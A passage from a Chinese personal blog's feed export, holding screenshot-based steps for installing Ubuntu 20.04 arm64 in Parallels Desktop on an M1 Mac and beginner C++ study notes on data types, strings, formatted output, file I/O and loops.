<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ubuntu%E5%AE%89%E8%A3%85%E6%82%A8%E5%9C%A8%E4%BB%80%E4%B9%88%E5%9C%B0%E6%96%B9.PNG"></p>
<p>选择“Shanghai”：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ubuntu%E5%AE%89%E8%A3%85%E5%9C%A8%E4%B8%8A%E6%B5%B7.PNG"></p>
<p>继续设置姓名：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ubuntu%E5%AE%89%E8%A3%85%E6%82%A8%E6%98%AF%E8%B0%81.PNG"></p>
<p>输入姓名、计算机名、用户名及密码：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ubuntu%E5%AE%89%E8%A3%85%E5%A7%93%E5%90%8D.PNG"></p>
<p>继续进入安装页面，等待：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ubuntu%E5%AE%89%E8%A3%85%E7%AD%89%E5%BE%85.PNG"></p>
<p>安装成功后，进入选择在线账号：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ubuntu%E5%AE%89%E8%A3%85%E5%9C%A8%E7%BA%BF%E8%B4%A6%E5%8F%B7.PNG"></p>
<p>跳过即可，Livepatch：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ubuntu%E5%AE%89%E8%A3%85livepatch.PNG"></p>
<p>帮助改进 Ubuntu：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/%E5%B8%AE%E5%8A%A9%E6%94%B9%E8%BF%9Bubuntu.PNG"></p>
<p>准备就绪：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ubuntu%E5%87%86%E5%A4%87%E5%B0%B1%E7%BB%AA.PNG"></p>
<p>安装完成：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ubuntu%E5%AE%89%E8%A3%85%E5%AE%8C%E6%88%90.PNG"></p>
]]></content>
      <tags>
        <tag>Notes</tag>
      </tags>
  </entry>
  <entry>
    <title>谁说 M1 Mac 不能安装虚拟机？</title>
    <url>/macOS-PD-Ubuntu-20-04/</url>
    <content><![CDATA[<p>macOS&amp;Parallels_Desktop&amp;Ubuntu_20.04 安装虚拟机过程记录</p>
<a id="more"></a>

<p><img src="https://raw.githubusercontent.com/SuperPung/Pictures/main/Exitalk.png"></p>
<p>本文使用的软件版本及系统环境：</p>
<ul>
<li>macOS Big Sur (arm64)</li>
<li>Ubuntu 20.04.2 LTS (arm64)</li>
<li>Parallels Desktop 16 for M1 Mac Technical Preview</li>
</ul>
<h1 id="下载-Ubuntu-20-04-2-arm64-iso-文件"><a href="#下载-Ubuntu-20-04-2-arm64-iso-文件" class="headerlink" title="下载 Ubuntu 20.04.2 arm64 iso 文件"></a>下载 Ubuntu 20.04.2 arm64 iso 文件</h1><p>由于大部分主流操作系统（Windows、macOS等）均为 amd64（即<a href="https://zh.wikipedia.org/wiki/X86-64">x86-64</a>）架构，Ubuntu 各版本镜像文件也都以 amd64 为主。先后在<a href="https://cn.ubuntu.com/">Ubuntu官网</a>、<a href="https://releases.ubuntu.com/">Ubuntu releases</a>、<a href="https://mirrors.tuna.tsinghua.edu.cn/">清华大学开源软件镜像站</a>、<a href="https://mirrors.163.com/">网易开源镜像站</a>等处均未找到 arm 版本镜像文件。</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ubuntuReleases.png"></p>
<p>最后终于在<a href="http://cdimage.ubuntu.com/">Ubuntu CDImage</a>处找到。</p>
<p>访问<a href="http://cdimage.ubuntu.com/">Ubuntu CDImage</a>，若点击“releases/”并进入其子目录后，无法找到 arm 版本的桌面镜像，最多可以找到各版本的 arm 服务器安装镜像（这已经比<a href="https://releases.ubuntu.com/">Ubuntu releases</a>全面了）：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ubuntuCdimageReleases.png"></p>
<p>正确的“打开方式”是，不进入“releases/”，而是进入“focal/”-“daily-live”-“current”，此时就可以看到我们要下载的 arm 桌面镜像了：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ubuntuCdimage.png"></p>
<p>点击右侧“64-bit ARM (ARMv8/AArch64) desktop image”即可下载。</p>
<p>或直接点此<a href="http://cdimage.ubuntu.com/focal/daily-live/current/focal-desktop-arm64.iso">下载链接</a>进行下载。</p>
<blockquote>
<p>注：下载可能需要国际网络环境。</p>
</blockquote>
<h1 id="下载-Parallels-Desktop"><a href="#下载-Parallels-Desktop" class="headerlink" title="下载 Parallels Desktop"></a>下载 Parallels Desktop</h1><p>访问<a href="https://www.parallels.com/blogs/parallels-desktop-apple-silicon-mac/">文章链接</a>，点击“Try Technical Preview”，登录，阅读 “Step 1”、“Step 2”后，进入“Step 3”，点击“Parallels Desktop 16 for M1 Mac build 50393”右侧的“DOWNLOAD”即可下载，记录下方的 MD5 校验和和激活密钥。</p>
<p>或直接点此<a href="https://www.parallels.com/directdownload/pdbeta">下载链接</a>进行下载。</p>
<blockquote>
<p>注：下载可能需要国际网络环境。</p>
</blockquote>
<p>下载完成后，检查 MD5 校验和：打开“终端”，键入<code>md5 </code>（注意空格）并将 dmg 文件拖至其后，得到的 MD5 校验和与 Parallels 给出的进行比较，若一致则文件完好。</p>
<h1 id="安装-Parallels-Desktop"><a href="#安装-Parallels-Desktop" class="headerlink" title="安装 Parallels Desktop"></a>安装 Parallels Desktop</h1><p>双击 dmg 文件，按照提示即可成功安装。</p>
<h1 id="新建虚拟机"><a href="#新建虚拟机" class="headerlink" title="新建虚拟机"></a>新建虚拟机</h1><p>输入激活密钥后，打开 Parallels Desktop：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/pd%E6%89%93%E5%BC%80.png"></p>
<p>继续，新建虚拟机：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/pd%E8%87%AA%E5%8A%A8%E6%9F%A5%E6%89%BE.png"></p>
<p>点击“手动选择”：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/pd%E6%89%8B%E5%8A%A8%E9%80%89%E6%8B%A9.png"></p>
<p>点击“选择文件…”并选择下载好的 iso 文件：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/pd%E6%96%B0%E5%BB%BA.png"></p>
<p>识别为“Ubuntu Linux”后，点击“继续”开始安装。</p>
<p>稍等片刻即成功创建虚拟机。</p>
<h1 id="开启虚拟机，安装-Ubuntu"><a href="#开启虚拟机，安装-Ubuntu" class="headerlink" title="开启虚拟机，安装 Ubuntu"></a>开启虚拟机，安装 Ubuntu</h1><p>开启虚拟机，选择语言为“中文(简体)”：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/pd%E6%AC%A2%E8%BF%8E.png"></p>
<p>继续，选择键盘布局：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/pd%E9%94%AE%E7%9B%98%E5%B8%83%E5%B1%80.png"></p>
<p>默认，继续，选择安装选项，取消“安装 Ubuntu 时下载更新”以节约安装的时间：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/pd%E5%8F%96%E6%B6%88%E6%9B%B4%E6%96%B0.png"></p>
<p>继续，选择安装类型“清除整个磁盘并安装 Ubuntu”：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/pd%E5%AE%89%E8%A3%85%E7%B1%BB%E5%9E%8B.png"></p>
<p>现在安装，将改动写入磁盘：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/pd%E5%86%99%E5%85%A5%E7%A3%81%E7%9B%98.png"></p>
<p>继续选择地区为“Shanghai”：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/pd%E4%B8%8A%E6%B5%B7.png"></p>
<p>继续设置姓名：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/pd%E5%A7%93%E5%90%8D.png"></p>
<p>输入姓名、计算机名、用户名及密码后，继续进入安装页面，等待：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/pd%E5%AE%89%E8%A3%85%E7%AD%89%E5%BE%85.png"></p>
<p>安装成功后，进入选择在线账号：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/pd%E5%9C%A8%E7%BA%BF%E8%B4%A6%E5%8F%B7.png"></p>
<p>跳过即可，Livepatch：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/pdLivepatch.png"></p>
<p>隐私设置：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/pd%E9%9A%90%E7%A7%81.png"></p>
<p>帮助改进 Ubuntu：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/pd%E5%B8%AE%E5%8A%A9%E6%94%B9%E8%BF%9B.png"></p>
<p>准备就绪：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/pd%E5%87%86%E5%A4%87%E5%B0%B1%E7%BB%AA.png"></p>
<p>安装完成：</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/pd%E5%AE%89%E8%A3%85%E5%AE%8C%E6%88%90.png"></p>
]]></content>
      <tags>
        <tag>Notes</tag>
      </tags>
  </entry>
  <entry>
    <title>关于 C++ 你不能不知道的事</title>
    <url>/IPC-Notes/</url>
    <content><![CDATA[<p>A passage about C++ - Introduction to Programming with C++_Notes</p>
<a id="more"></a>

<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ExiTalk.png"></p>
<h1 id="序"><a href="#序" class="headerlink" title="序"></a>序</h1><ul>
<li>C++融合了3种不同的编程方式：C语言代表的过程性语言、C++在C语言基础上添加的类代表的面向对象语言以及C++模板支持的泛型编程。</li>
<li>高级（high-level）语言致力于解决问题，而不针对特定的硬件。（可移植性）</li>
<li>一般来说，计算机语言要处理两个概念——<strong>数据</strong>和<strong>算法</strong>。数据是程序使用和处理的信息，而算法是程序使用的方法。</li>
<li>C语言是过程性（procedural）语言，强调的是编程的<strong>算法</strong>方面。</li>
<li>虽然结构化编程的理念提高了程序的清晰度、可靠性，并使之便于维护，但它在编写大型程序时，仍面临着挑战。</li>
<li>为应付这种挑战，OOP提供了一种新方法。与C语言不同的是，OOP强调的是<strong>数据</strong>。</li>
<li>OOP不像过程性编程那样，试图使问题满足语言的过程性方法，而是试图让语言来满足问题的要求。其理念是设计与问题的本质特性相对应的数据格式。</li>
<li>在C++中，类是一种规范，它描述了这种新型数据格式，对象是根据这种规范构造的特定数据结构。</li>
<li><strong>泛型编程（generic programming）</strong>与OOP的目标相同——使重用代码和抽象通用概念的技术更简单。</li>
</ul>
<h1 id="基本知识"><a href="#基本知识" class="headerlink" title="基本知识"></a>基本知识</h1><ol>
<li><p>成员函数<br><code>.getline</code>读入一行，<code>.get</code>读入一个字符。</p>
</li>
<li><p>基本数据类型</p>
</li>
</ol>
<ul>
<li>整型：<code>int</code>整型，<code>unsigned int</code>或<code>unsigned</code>无符号整型，<code>short</code>或<code>short int</code>短整型，<code>unsigned short</code>或<code>unsigned short int</code>无符号短整型，<code>long</code>或<code>long int</code>长整型，<code>unsigned long</code>或<code>unsigned long int</code>无符号长整型。</li>
<li>浮点型：<code>float</code>单精度浮点型，<code>double</code>双精度浮点型，<code>long double</code>长精度浮点型。</li>
<li>字符型：<code>char</code>字符型，<code>unsigned char</code>无符号字符型。</li>
<li>布尔型：<code>bool</code>。</li>
</ul>
<blockquote>
<p>一个有符号短整型数所能表示的数值中，有一半是负数，另一半是正数。而一个无符号短整型数所能表示的数值都是非负的。由于两种类型占用一样大的内存空间，因此存储在一个无符号整型数中的最大值，是一个有符号整型数所能保存的最大正数值的两倍。如果确定一个变量的值始终为非负，那么就将它声明为无符号数。</p>
</blockquote>
<ol start="3">
<li><p>位/bit/二进制位<br>计算机的最小存储单元是字节（byte），1 byte = 8 bits。1 KB = $10^3$ bytes，1 MB = $10^6$ bytes，1 GB = $10^9$ bytes，1 TB = $10^{12}$ bytes。</p>
</li>
<li><p>内存</p>
</li>
</ol>
<ul>
<li>内存由一系列有序的字节构成，用来存储程序和程序所操作的数据。可以把内存看作计算机执行程序的工作区域。</li>
<li>每个字节在内存中都有一个唯一的地址，地址用来在存储和查找数据时定位字节的位置。由于内存中的字节可以按照任意顺序进行读取，所以内存又称为<strong>随机存储器（Random Access Memory，RAM）</strong>。</li>
<li>内存是易失的，即断电后信息会丢失。</li>
</ul>
<ol start="5">
<li><p><code>#</code>磅符号，表示一个预处理指令。</p>
</li>
<li><p>每个子组成部分或语句要比嵌套它的结构多空两格。二元操作符的两端都应该增加一个空格。程序段之间要加空行。</p>
</li>
<li><p>标识符<br>标识符是程序中定义类似变量、函数之类元素的名字。</p>
</li>
</ol>
<ul>
<li>一个标识符是一个字符序列，可以包含字母、数字和下划线。</li>
<li>一个标识符必须以一个字母或一个下划线开头，不能以数字开头。</li>
<li>不能使用保留字作为标识符。</li>
<li>一个标识符理论上可以任意长，但我们使用的具体的C++编译器可能会有限制，使用31个字符或更短的标识符可保证程序的可移植性。</li>
</ul>
<ol start="8">
<li><p><code>const</code>声明常量，常量名字大写。</p>
</li>
<li><p>默认情况下，一个整数文字常量表示一个十进制整数，一个八进制整数文字常量，使用前缀0，十六进制整数文字常量，使用前缀<code>0x</code>或<code>0X</code>。</p>
</li>
<li><p>取模运算<code>%</code>的运算对象只能是整数。</p>
</li>
<li><p>自增<code>++</code>和自减<code>--</code>位于前后的区别。</p>
</li>
</ol>
<blockquote>
<p>通常，IDE允许在辅助窗口中运行程序。程序执行完毕后，有些IDE将关闭该窗口，而有些IDE不关闭。为查看输出，必须在程序的最后加上一些代码：</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cin</span>.<span class="built_in">get</span>(); <span class="comment">// add this statement</span></span><br><span class="line"><span class="built_in">cin</span>.<span class="built_in">get</span>(); <span class="comment">// and maybe this, too</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p><code>cin.get()</code>语句读取下一次键击，因此上述语句让程序等待，直到按下了<code>Enter</code>键（在按下<code>Enter</code>键之前，键击将不被发送给程序，因此按其他键都不管用）。如果程序在其常规输入后留下一个没有被处理的键击，则第二条语句是必需的。</p>
</blockquote>
<h1 id="分支（branch）"><a href="#分支（branch）" class="headerlink" title="分支（branch）"></a>分支（branch）</h1><ol start="12">
<li><p>数值类型转换<br><code>static_cast&lt;type&gt;(value)</code>或C类型转换<code>(type)value</code>/<code>type(value)</code>。</p>
</li>
<li><p>浮点数有限制的精度，涉及浮点数的计算会导致舍入误差，因此两个浮点数之间的相等性测试是不可靠的。</p>
</li>
<li><p><code>abs()</code>在<code>cmath</code>库，<code>rand()</code>在<code>cstdlib</code>库，<code>srand(time(0))</code>种子。</p>
</li>
<li><p><code>&amp;&amp;</code>有条件的与运算符/短路与运算符，<code>||</code>有条件的或运算符/短路或运算符，<code>&amp;</code>与位操作，<code>|</code>或位操作。</p>
</li>
<li><p><code>switch</code>语句（书签）<br>一个<code>switch</code>语句基于一个变量的值或者是一个表达式来执行语句。</p>
</li>
</ol>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span> (<span class="keyword">switch</span>-<span class="keyword">expression</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">case</span> value1: statement(s)<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> value2: statement(s)<span class="number">2</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">case</span> valueN: statement(s)N;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:     statement(s)-<span class="keyword">for</span>-<span class="keyword">default</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>switch</code>表达式必须产生一个整型值，而且必须放在括号内。</li>
<li><code>value1</code>，…，<code>valueN</code>是整型常量表达式，即表达式中不能包含变量，如<code>1 + x</code>就是非法的。这些值必须是整型值，不能是浮点型值。</li>
<li>当某个<code>case</code>语句中的值与<code>switch</code>表达式的值相等，则从此<code>case</code>语句开始执行后续语句，直至遇到一个<code>break</code>语句或者到达<code>switch</code>语句末尾。</li>
<li><code>default</code>情况是可选的，它用于指出，在任何指定情况均与<code>switch</code>表达式不匹配时，执行什么动作。</li>
<li>关键字<code>break</code>是可选的，<code>break</code>语句会立刻终止<code>switch</code>语句。</li>
</ul>
<blockquote>
<p>在需要使用<code>break</code>的地方不要遗漏。当某个<code>case</code>语句被匹配时，会从这个<code>case</code>语句开始执行，直至遇到一个<code>break</code>语句或到达<code>switch</code>语句的末尾。这种现象被称为<strong>直通行为（fall-through behavior）</strong>。</p>
</blockquote>
<ol start="17">
<li><p>条件表达式<code>boolean-expression ? expression1 : expression2;</code>（C++中唯一的三元运算符）。</p>
</li>
<li><p>运算符优先级（从高到低）</p>
</li>
</ol>
<ul>
<li>var++ var - -</li>
<li>+（一元） -（一元） ++var - -var</li>
<li>static_cast(v) (type)(Casting)</li>
<li>!</li>
<li>* / %</li>
<li>+（二元） -（二元）</li>
<li>&lt; &lt;= &gt; &gt;=</li>
<li>== !=</li>
<li>&amp;&amp;</li>
<li>||</li>
<li>= += -= *= /= %=</li>
</ul>
<ol start="19">
<li>逻辑错误叫做<strong>bug</strong>，找到和改正错误的过程叫做<strong>调试（debugging）</strong>。</li>
</ol>
<h1 id="字符与字符串（character-amp-string）"><a href="#字符与字符串（character-amp-string）" class="headerlink" title="字符与字符串（character&amp;string）"></a>字符与字符串（character&amp;string）</h1><ol start="20">
<li><p>在<code>cmath</code>头文件中的函数：<code>sin(radians)</code>正弦，<code>cos(radians)</code>余弦，<code>tan(radians)</code>正切，<code>asin(a)</code>反正弦，<code>acos(a)</code>反余弦，<code>atan(a)</code>反正切，<code>exp(x)</code>返回$e^x$的值，<code>log(x)</code>返回自然对数的值，<code>log10(x)</code>返回常用对数的值，<code>pow(a,b)</code>返回$a^b$的值，<code>sqrt(x)</code>返回$\sqrt x$的值（x $\geqslant$ 0），<code>ceil(x)</code>向上取整（<code>double</code>型），<code>floor(x)</code>向下取整（<code>double</code>型）。</p>
</li>
<li><p>在GNU C++中，<code>min(a,b)</code>、<code>max(a,b)</code>和<code>abs(x)</code>函数都定义在<code>cstdlib</code>头文件下，而在Visual C++ 2013中<code>min(a,b)</code>和<code>max(a,b)</code>定义在<code>algorithm</code>头文件下。</p>
</li>
<li><p>一个字符数据类型<code>char</code>代表一个单独的字符，一个字符在计算机中存储为许多0和1，把一个字符映射到它的二进制码叫做<strong>编码（encoding）</strong>。编码方式有许多，如<code>ASCII</code>，一种8位的编码方案来表示所有大写字母、小写字母、数字、标点符号和控制字符。在大多数系统上，<code>char</code>类型是1字节。</p>
</li>
<li><p>转义序列</p>
</li>
</ol>
<table>
<thead>
<tr>
<th align="center">转义序列</th>
<th align="center">名称</th>
<th align="center">ASCII值</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>\b</code></td>
<td align="center">回退符</td>
<td align="center">8</td>
</tr>
<tr>
<td align="center"><code>\t</code></td>
<td align="center">制表符</td>
<td align="center">9</td>
</tr>
<tr>
<td align="center"><code>\n</code></td>
<td align="center">换行符</td>
<td align="center">10</td>
</tr>
<tr>
<td align="center"><code>\f</code></td>
<td align="center">换页符</td>
<td align="center">12</td>
</tr>
<tr>
<td align="center"><code>\r</code></td>
<td align="center">回车符</td>
<td align="center">13</td>
</tr>
<tr>
<td align="center"><code>\&quot;</code></td>
<td align="center">双引号</td>
<td align="center">34</td>
</tr>
</tbody></table>
<blockquote>
<p>字符<code>&#39; &#39;</code>、<code>&#39;\t&#39;</code>、<code>&#39;\f&#39;</code>、<code>&#39;\r&#39;</code>和<code>&#39;\n&#39;</code>被称为<strong>空白字符（whitespace character）</strong>。</p>
</blockquote>
<ol start="24">
<li><p>一个字符能被转换为任何数值类型，反之亦然。当一个整数被转换为一个字符的时候，只有低8位能被使用，剩下的部分就被忽略掉了。</p>
</li>
<li><p>当一个浮点数转换为一个字符类型时，浮点数先转换为<code>int</code>类型，然后再转换成<code>char</code>类型。当一个<code>char</code>类型转换成一个数值类型时，字符的<code>ASCII</code>码被转换到指定的数值变量中。</p>
</li>
<li><p><code>char</code>类型被看作byte长度的整数。所有的数值运算符都可以用于<code>char</code>操作。当其中的另一个操作对象是数字或者是字符时，<code>char</code>会自动转换为数字。</p>
</li>
<li><p>   <code>cctype</code>头文件存储了测试字符和转换字符的函数，返回<code>int</code>值。</p>
</li>
</ol>
<table>
<thead>
<tr>
<th align="center">函数</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>isdigit(ch)</code></td>
<td align="center">如果指定的字符是数字，则返回<code>true</code></td>
</tr>
<tr>
<td align="center"><code>isalpha(ch)</code></td>
<td align="center">如果指定的字符是字母，则返回<code>true</code></td>
</tr>
<tr>
<td align="center"><code>isalnum(ch)</code></td>
<td align="center">如果指定的字符是字母或数字，则返回<code>true</code></td>
</tr>
<tr>
<td align="center"><code>islower(ch)</code></td>
<td align="center">如果指定的字符是大写字母，则返回<code>true</code></td>
</tr>
<tr>
<td align="center"><code>isspace(ch)</code></td>
<td align="center">如果指定的字符是空白字符，则返回<code>true</code></td>
</tr>
<tr>
<td align="center"><code>tolower(ch)</code></td>
<td align="center">返回指定字符的小写形式</td>
</tr>
<tr>
<td align="center"><code>toupper(ch)</code></td>
<td align="center">返回指定字符的大写形式</td>
</tr>
</tbody></table>
<ol start="28">
<li><code>string</code>不是原有的数据类型，它被认为是一个<strong>对象类型（object type）</strong>。当声明一个对象类型的变量时，变量实际上代表了一个对象。声明一个对象实际上是创建一个对象。对象是通过类定义的，<code>string</code>就是一个预先定义在<code>string</code>头文件中的类。</li>
</ol>
<blockquote>
<p>为了使用<code>string</code>类型，需要<code>#include &lt;string&gt;</code>。</p>
</blockquote>
<ol start="29">
<li><code>string</code>对象的简单函数</li>
</ol>
<table>
<thead>
<tr>
<th align="center">函数</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>length()</code></td>
<td align="center">返回字符串中的字符个数</td>
</tr>
<tr>
<td align="center"><code>size()</code></td>
<td align="center">同<code>length()</code></td>
</tr>
<tr>
<td align="center"><code>at(index)</code></td>
<td align="center">返回字符串中指定位置的字符</td>
</tr>
</tbody></table>
<blockquote>
<p><code>string</code>类的函数只能被特定的<code>string</code>实例调用，故这些函数被称为<strong>实例函数（instance function）</strong>。调用一个实例函数的语法是<code>objectName.functionName(arguments)</code>，注意长度与位置不同。</p>
</blockquote>
<ol start="30">
<li><p>默认<code>string</code>被初始化为空字符串，即<code>string s;</code>与<code>string s = &quot;&quot;;</code>等价。</p>
</li>
<li><p><code>stringName[index] = char</code>：重写<code>index + 1</code>处字符。</p>
</li>
<li><p>直接连接两个字符串是非法的。例如，下面的代码是不合法的：</p>
</li>
</ol>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">string cities</span> = <span class="string">&quot;London&quot;</span> + <span class="string">&quot;Paris&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>然而，下面的代码是正确的，因为它先把字符串s和”London”连接起来，然后新的字符串再把”Paris”连接起来。</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">string s</span> = <span class="string">&quot;New York&quot;</span>;</span><br><span class="line"><span class="attribute">string cities</span> = s + <span class="string">&quot;London&quot;</span> + <span class="string">&quot;Paris&quot;</span>;</span><br></pre></td></tr></table></figure>
<ol start="33">
<li><p>可用==、!=、&lt;、&gt;、&lt;=、&gt;=从左到右比较字符串。</p>
</li>
<li><p><code>cin</code>可读取字符串，以空白字符结束。</p>
</li>
<li><p><code>string</code>头文件中的<code>getline</code>函数可读取字符串：</p>
</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">getline(<span class="built_in">cin</span>, s, delimitCharacter);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>第三个参数<code>delimitCharacter</code>有一个默认值<code>&#39;\n&#39;</code>，读到但不存储在<code>string</code>里。</p>
</blockquote>
<ol start="36">
<li>格式化控制台输出<br><code>iomanip</code>头文件，常用的流操作有</li>
</ol>
<table>
<thead>
<tr>
<th align="center">操作</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>setprecision(n)</code></td>
<td align="center">设定一个浮点数的精度</td>
</tr>
<tr>
<td align="center"><code>fixed</code></td>
<td align="center">显示指定小数位数的浮点数</td>
</tr>
<tr>
<td align="center"><code>showpoint</code></td>
<td align="center">即使没有小数部分也显示以零补足的小数点后位数</td>
</tr>
<tr>
<td align="center"><code>setw(width)</code></td>
<td align="center">指定打印字段的宽度</td>
</tr>
<tr>
<td align="center"><code>left</code></td>
<td align="center">调整输出到左边</td>
</tr>
<tr>
<td align="center"><code>right</code></td>
<td align="center">调整输出到右边</td>
</tr>
</tbody></table>
<ul>
<li>n是小数点前后位数的总和（取近似值），<code>setprecision</code>操作的作用是直到精度改变之前，一直保持效果（不够一个整数，则被忽略）。</li>
<li><code>fixed</code>操作来强制数字显示为非科学记数法的形式，显示小数点后的位数默认情况下能修复小数点后6位（与<code>setprecision</code>搭配使用）。</li>
<li><code>setw</code>只影响下一次输出，默认右对齐（可以在前面用<code>cout &lt;&lt; left &lt;&lt;</code>或<code>cout &lt;&lt; right &lt;&lt;</code>调整）。宽度可自动增加。</li>
<li>n和width可以是整数变量、表达式或常量。</li>
</ul>
<ol start="37">
<li>简单的文件输入输出（需<code>#include &lt;fstream&gt;</code>）</li>
</ol>
<ul>
<li>写入文件<code>ofstream output;</code>（声明此类型变量），<code>output.open(&quot;numbers.txt&quot;);</code>（创建文件，若存在则销毁重建）。</li>
<li>创建输出对象并打开文件<code>ofstream output(&quot;numbers.txt&quot;);</code>。</li>
<li>写入数据<code>output &lt;&lt;</code>，输入完成<code>output.close();</code>。</li>
<li>读取文件<code>ifstream input;</code>，<code>input.open(&quot;numbers.txt&quot;);</code>，若不存在将出现<code>unexpected error</code>。</li>
<li>创建输入对象并打开文件<code>ifstream input(&quot;numbers.txt&quot;);</code>。</li>
<li>读取数据<code>input &gt;&gt;</code>，完成<code>input.close();</code>。</li>
</ul>
<ol start="38">
<li>   C字符串是一个字符数组，以<code>&#39;\0&#39;</code>（空终结符）结尾，<code>char city[7] = &quot;Dallas&quot;;</code><br>第一条语句是一个C字符串，第二条语句是一个字符数组。第一个有7个字符（包括最后的空终结符），第二个有6个字符。</li>
</ol>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> city1[] = <span class="string">&quot;Dallas&quot;</span>; <span class="comment">// C-string</span></span><br><span class="line"><span class="keyword">char</span> city2[] = &#123; <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;s&#x27;</span> &#125;; <span class="comment">// not a string</span></span><br></pre></td></tr></table></figure>
<ol start="40">
<li><p>输出C字符串<code>cout &lt;&lt; s;</code>。读取有空格的C字符串，<code>iostream</code>头文件中的<code>cin.getline</code>函数：<code>cin.getline(char array[], int size, char delimitedChar)</code>，其中<code>delimitedChar</code>默认为<code>&#39;\n&#39;</code>。当遇到<code>&#39;\0&#39;</code>或者读取了<code>size-1</code>个字符之后，函数停止读入字符，最后一个字符被空终结符替代。</p>
</li>
<li><p>   C字符串传递给函数时可以不用传递它的长度。</p>
</li>
<li><p>   size_t是一个C++类型，对于大多数编译器，它和<code>unsigned int</code>相同。</p>
</li>
<li><p>   复制C字符串必须使用<code>strcpy</code>函数。</p>
</li>
</ol>
<h1 id="循环（loop）"><a href="#循环（loop）" class="headerlink" title="循环（loop）"></a>循环（loop）</h1><ol start="44">
<li><p>   不要在循环继续条件中使用浮点数的相等性判定。</p>
</li>
<li><p>   输入和输出重定向<br>如果有许多数据需要输入，那么可以在一个文件中存储数据，使用空格分隔开，如<code>input.txt</code>，然后用<code>SentinelValue.exe &lt; input.txt</code>命令运行程序，这个命令叫做<strong>输入重定向（input redirection）</strong>。<code>SentinelValue.exe</code>可以通过编译器命令行获取：</p>
</li>
</ol>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">g++ <span class="module-access"><span class="module"><span class="identifier">SentinelValue</span>.</span></span>cpp -o <span class="module-access"><span class="module"><span class="identifier">SentinelValue</span>.</span></span>exe</span><br></pre></td></tr></table></figure>
<ol start="46">
<li><p>   <code>input</code>对象的<code>eof()</code>函数来检测是否已经到了文件末尾（返回<code>true</code>或者<code>false</code>）。</p>
</li>
<li><p>   循环：<code>do-while</code>、<code>while</code>、<code>for</code>。嵌套循环运行可能需要很长时间。</p>
</li>
<li><p>   <code>continue</code>跳出一次迭代（只能在循环内使用），<code>break</code>结束整个循环。</p>
</li>
<li><p>   例：十进制转换为十六进制</p>
</li>
</ol>
